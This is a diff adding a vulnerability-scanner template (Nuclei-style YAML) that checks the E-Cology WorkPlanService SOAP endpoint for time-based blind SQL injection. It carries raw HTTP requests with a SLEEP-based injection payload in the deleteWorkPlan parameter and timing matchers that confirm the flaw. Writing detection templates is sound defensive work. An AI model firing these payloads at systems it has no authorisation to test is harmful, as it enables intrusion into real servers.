@@ -1,0 +1,75 @@
+id: e-cology-workplanservice-sqli
+info:
+  name: SQL Injection in WorkPlanService Endpoint of E-Cology
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection,e-cology
+  description: |
+    This template detects a SQL injection vulnerability in the WorkPlanService endpoint of the E-Cology application.
+
+variables:
+  t1: "{{rand_int(5,10)}}"
+  t2: "{{to_number(t1)+2}}"
+  t3: "{{rand_int(1,4)}}"
+  t4: "{{to_number(t3)+2}}"
+
+http:
+  - raw:
+      - |
+        POST /services/WorkPlanService HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: text/xml;charset=UTF-8
+
+        <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:web="webservices.workplan.weaver.com.cn">
+          <soapenv:Header/>
+          <soapenv:Body>
+            <web:deleteWorkPlan>
+              <web:in0>(SELECT 8544 FROM (SELECT(SLEEP({{t1}}-(IF(27=27,0,5)))))NZeo)</web:in0>
+              <web:in1>22</web:in1>
+            </web:deleteWorkPlan>
+          </soapenv:Body>
+        </soapenv:Envelope>
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "ns1:out"
+          - "soap:Body"
+      - type: dsl
+        dsl:
+          - duration >= to_number(t1)
+          - duration <= to_number(t2)
+
+  - raw:
+      - |
+        POST /services/WorkPlanService HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: text/xml;charset=UTF-8
+
+        <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:web="webservices.workplan.weaver.com.cn">
+          <soapenv:Header/>
+          <soapenv:Body>
+            <web:deleteWorkPlan>
+              <web:in0>(SELECT 8544 FROM (SELECT(SLEEP({{t3}}-(IF(27=27,0,5)))))NZeo)</web:in0>
+              <web:in1>22</web:in1>
+            </web:deleteWorkPlan>
+          </soapenv:Body>
+        </soapenv:Envelope>
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "ns1:out"
+          - "soap:Body"
+      - type: dsl
+        dsl:
+          - duration >= to_number(t3)
+          - duration <= to_number(t4)
